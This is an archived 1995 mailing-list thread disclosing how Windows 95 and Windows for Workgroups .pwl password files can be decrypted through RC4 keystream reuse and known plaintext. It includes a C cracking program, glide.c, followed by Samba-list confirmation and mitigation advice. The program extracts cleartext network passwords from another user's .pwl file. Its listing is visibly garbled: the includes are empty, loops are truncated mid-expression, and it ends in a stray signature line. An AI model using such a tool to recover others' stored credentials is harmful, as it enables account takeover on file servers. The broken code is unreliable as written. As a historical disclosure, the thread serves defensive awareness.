@@ -1,0 +1,285 @@
+                        Decryption of Win95 Passwords
+
+----------------------------------------------------------------------------
+
+Basically, you should be aware that if you ever mount disks from Unix
+machines to Windows95 machines, the passwords of the unix machine (or
+your other file servers) will be stored on the Windows machine's disk
+essentially in the plain, and any 10-year computer-literate kid with a
+little knowledge will be able to retrieve them in seconds if he gets
+access to client machine.
+
+The message below explains the details.  Essentially it means that
+the whole encryption scheme used by Microsoft in Windows95 is a Bad
+Joke.  Not only does it use too short keys (breakable by brute force
+in 8 hours on a normal workstation), but additionally it screws up the
+implementation, meaning that your keys can be trivially decrypted
+in a fraction of a second without ever even brute-forcing the key.
+The program to do this is below.
+
+I find this kind of "security" shocking.  I think this should go to
+the mass media.  At least make people at your sites aware of this
+fiasco.
+
+    Tatu
+
+------- start of forwarded message (RFC 934 encapsulation) -------
+From: Frank Andrew Stevenson
+To: cypherpunks@toad.com
+Subject: Cracked: WINDOWS.PWL
+Date: Mon, 4 Dec 1995 17:51:36 +0100 (MET)
+
+A few days ago Peter Gutmann posted a description on how
+Windows 95 produces RC4 keys of 32 bits size to protect
+the .pwl files. I verified the information and wrote a
+program to decrypt .pwl files with a known password, I then
+discovered that the .pwl files where well suited for a known
+plaintext attack as the 20 first bytes are completely predictable.
+
+The 20 first bytes of any .pwl files contains the username, which
+is the same as the filename, in capitals, padded with 0x00. From then
+I wrote a program to bruteforce the .pwl file and optimized it
+so it would run in less than 24 hours on an SGI. I run a test
+of the bruter software and recovered an unknown rc4 key in 8 hours,
+but the decrypted file was still largely uninteligeble, I then proceeded
+to decrypt the file at all possible starting points, and discovered
+valuable information (cleartext passwords) offset in the file.
+
+This has enormous implications: RC4 is a stream cipher, it
+generates a long pseudo random stream that it uses to XOR the
+data byte by byte. This isn't neccecaraly weak encryption if you
+don't use the same stream twice: however WIN95 does, every resource is
+XORed with the same pseudo random stream. What's more the 20
+first bytes are easy to guess. This is easy to exploit:
+XOR the 20 bytes starting at position 0x208 with the user name
+in uppercase, and slide this string through the rest of the file
+(xoring it with whatever is there) this reveals the 20
+first bytes of the different resources.
+
+>From there I went on to study the structure of the .pwl file it is
+something like this (decrypted):
+
+USERNAME.........wpwpwpwpwpwpwpwpwpwp
+rs???????
+rs
+rs
+rs???????????
+rs???????
+
+where wp is i word pointer to the different resources (from start
+of pwl file) The 2 first bytes of the resource (rs) is its length in bytes
+(of course XOR with RC4 output) It is the fairly easy to find all the
+resource pointers by jumping from start of resource to next resource,
+had it not been for the fact that the size sometimes is incorrect
+(courtesy of M$)
+
+What follows is a short c program that tries to remedy this and
+reconstruct the pointertable thus generating at least 54 bytes of the RC4
+pseudorandom stream, and then proceedes to decrypt as much as possible from
+the different resources.
+
+What does this show? Although RC4 is a fairly strong cipher, it has the
+same limitations as any XOR streamcipher, and implementing it without
+sufficient knowledge can have dire consequences. I strongly suggest that
+the programmers at Microsoft do their homework before trying anything like
+this again!
+
+
+DISCLAIMER:
+This is a quick hack, I don't make any claims about usefulness for
+any purpose, nor do I take responsibility for use nor consequences of
+use of the software. FUNCOM of Norway is not responsible for any of this,
+(I speak for myself, and let others speak for themselves)
+
+This source is hereby placed in the public domain, please
+improve if you can.
+
+- --- glide.c ---
+
+#include
+#include
+
+unsigned char Data[100001];
+unsigned char keystream[1001];
+int Rpoint[300];
+
+main (int argc,char *argv[]) {
+        FILE *fd;
+        int     i,j,k;
+        int     size;
+        char ch;
+        char *name;
+        int cracked;
+        int sizemask;
+        int maxr;
+        int rsz;
+        int pos;
+        int Rall[300]; /* resource allocation table */
+
+        if (argc<2) {
+                printf("usage: glide filename (username)");
+                exit(1);
+        }
+
+        /* read PWL file */
+
+        fd=fopen(argv[1],"rb");
+        if(fd==NULL) {
+                printf("can't open file %s",argv[2]);
+                exit(1);
+        }
+        size=0;
+        while(!feof(fd)) {
+                Data[size++]=fgetc(fd);
+        }
+        size--;
+        fclose(fd);
+
+        /* find username */
+        name=argv[1];
+        if(argc>2) name=argv[2];
+        printf("Username: %s\n",name);
+
+        /* copy encrypted text into keystream */
+        cracked=size-0x0208;
+        if(cracked<0) cracked=0;
+        if(cracked>1000) cracked=1000;
+        memcpy(keystream,Data+0x208,cracked );
+
+        /* generate 20 bytes of keystream */
+        for(i=0;i<20;i++) {
+                ch=toupper(name[i]);
+                if(ch==0) break;
+                if(ch=='.') break;
+                keystream[i]^=ch;
+        };
+        cracked=20;
+
+        /* find allocated resources */
+
+        sizemask=keystream[0]+(keystream[1]<<8);
+        printf("Sizemask: %04X\n",sizemask);
+
+        for(i=0;i<256;i++) Rall[i]=0;
+
+        maxr=0;
+        for(i=0x108;i<0x208;i++) {
+                if(Data[i]!=0xff) {
+                        Rall[Data[i]]++;
+                        if (Data[i]>maxr) maxr=Data[i];
+                }
+        }
+        maxr=(((maxr/16)+1)*16);        /* resource pointer table size appears to be divisible by 16 */
+
+        /* search after resources */
+
+        Rpoint[0]=0x0208+2*maxr+20+2;   /* first resource */
+        for(i=0;i> 8) & 0x00ff;
+        }
+        cracked+=maxr*2+2;
+
+        printf("%d bytes of keystream recovered\n",cracked);
+
+        /* decrypt resources */
+        for(i=0;i < maxr;i++) {
+                rsz=Rpoint[i+1]-Rpoint[i];
+                if (rsz>cracked) rsz=cracked;
+                printf("Resource[%d] (%d)\n",i,rsz);
+                for(j=0;j
+E3D2BCADBEF8C82F A5891D2B6730EA1B PGPencrypted mail preferred, finger for key
+
+------- end -------
+
+From owner-best-of-security@suburbia.net Tue Dec  5 11:25:09 1995
+Return-Path: owner-best-of-security@suburbia.net
+Received: from mail5 (root@mail5.netcom.com [192.100.81.141]) by onyx.infonexus.com (8.6.12/8.6.9) with ESMTP id LAA08923 for ; Tue, 5 Dec 1995 11:25:04 -0800
+Received: from yarrina.connect.com.au by mail5 (8.6.12/Netcom)
+        id LAA16224; Tue, 5 Dec 1995 11:19:40 -0800
+Received: from suburbia.net (suburbia.apana.org.au [192.188.107.90]) by yarrina.connect.com.au with ESMTP id GAA21167
+  (8.6.12/IDA-1.6); Wed, 6 Dec 1995 06:08:54 +1100
+Received: (majordom@localhost) by suburbia.net (8.6.12/Proff-950810) id GAA20352 for best-of-security-outgoing; Wed, 6 Dec 1995 06:07:49 +1100
+Received: from tavor.openu.ac.il (root@tavor.openu.ac.il [147.233.128.1]) by suburbia.net (8.6.12/Proff-950810) with SMTP id GAA20347 for ; Wed, 6 Dec 1995 06:
+Received: from ramon.openu.ac.il[rafi]
+   by tavor.openu.ac.il with SMTP id AA26474
+     (5.67a8/IDA-1.5 for ); Tue, 5 Dec 1995 21:06:56 +0200
+Received: by ramon.openu.ac.il id AA01003
+     (5.67a8/IDA-1.5); Tue, 5 Dec 1995 21:06:53 +0200
+Date: Tue, 5 Dec 1995 21:06:50 +0200 (IST)
+From: Rafi Sadowsky
+X-Sender: rafi@ramon
+To: Best Of Security List
+Cc: FIRST Teams
+Subject: BoS: win95 and WfWg .pwl files cracked(fwd)[folloup to yesterdays posting]
+Message-Id:
+Mime-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+Sender: owner-best-of-security@suburbia.net
+Errors-to: nobody@connect.com.au
+Precedence: bulk
+Reply-To: nobody@mail.uu.net
+Status: RO
+
+just thought the addition about exporting any shares ( due to the ../ bug in
+MS/win* ) making your *.pwl files readable to the whole internet
+night just make your life a trifle more interesting :-(
+
+--
+Rafi Sadowsky                                   rafi@tavor.openu.ac.il
+[postmaster@openu.ac.il]                        FAX: +972-3-6460744
+
+---------- Forwarded message ----------
+Date: Tue, 5 Dec 1995 23:12:12 +1100
+From: samba-bugs@anu.edu.au
+To: Multiple recipients of list
+Subject: win95 and WfWg .pwl files cracked
+
+I have just tried Frank Stevensons program for cracking .pwl files. It
+indeed works.
+
+With it I could obtain the plain text passwords from a Windows95 .pwl
+file or a windows for workgroups .pwl file in less than a second. I
+tried it on 3 different files. All were successfully decrypted.
+
+This is very bad.
+
+It means that anyone with access to a WfWg or Win95 box that has been
+used to login to a samba (or NT or OS/2 etc) server can take the .pwl
+files off the PC and use them to get valid passwords on the server.
+
+Note that this is not directly a security hole in samba. Its a huge
+security hole in the way WfWg and Win95 store their passwords on disk.
+It equally affects networks which use NT and OS/2 server. It also
+affects people who just use other WfWg and Win95 machines as servers.
+
+Also, if your WfWg and Win95 systems have not been patched to avoid
+the "cd ../" bug and you export any shares then anyone who can attach
+to those shares can obtain your .pwl files. It doesn't matter what
+directory you are exporting.
+
+What can you do about this?
+
+Well, if you don't care about security then just do nothing :-)
+
+Otherwise:
+
+First of all, change your router rules to disable tcp139, udp137 and
+udp138 from entering your network from the Internet.
+
+Secondly, disable your WfWG and Win95 boxes from saving passwords on
+disk when connecting to SMB servers. Can someone please post clear
+instructions on exactly how to do this? (preferably with how to make
+it permanent)
+
+Thirdly, delete all the .pwl files on your WfWG and Win95 boxes.
+
+Theres probably more you should do. I only found out about this
+decryption program a few minutes ago. I imagine more advice will be
+forthcoming from other people on this list.
+
+Andrew
+
+----------------------------------------------------------------------------
+
+[Image]
+
+
